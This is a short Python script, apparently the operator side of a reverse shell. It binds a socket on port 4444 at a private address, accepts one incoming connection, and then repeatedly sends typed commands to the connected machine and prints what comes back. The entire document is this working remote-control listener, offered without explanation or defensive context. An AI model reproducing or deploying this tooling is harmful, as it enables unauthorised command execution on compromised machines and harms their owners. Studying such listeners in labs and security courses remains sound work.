import socket

listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
listener.bind(("192.168.242.56",4444))
listener.listen(0)
print("[+] listener started..")
connection,address = listener.accept()
print("[*] Got connection from" +str(address))

while True:
    command = input("input >>")
    connection.send(command.encode('utf-8'))
    response = connection.recv(1024)
    print(response)